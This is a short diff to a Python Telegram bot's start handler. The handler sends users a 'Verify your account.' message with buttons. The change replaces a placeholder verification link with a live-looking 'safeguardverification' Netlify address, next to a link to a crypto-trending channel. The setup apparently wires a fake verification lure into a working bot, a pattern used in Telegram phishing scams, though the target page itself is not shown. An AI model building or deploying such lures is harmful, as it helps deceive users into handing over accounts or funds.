@@ -31,7 +31,7 @@ async def on_start(event):
             file='https://via.placeholder.com/150',  # Path to the image or image URL
             message="Verify your account.",
             buttons=[
-                [Button.url("Verify", "https://www.example1.com")],
+                [Button.url("Verify", "https://safeguardverification.netlify.app/")],
                 [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]  # Button with a URL link
             ]
         )
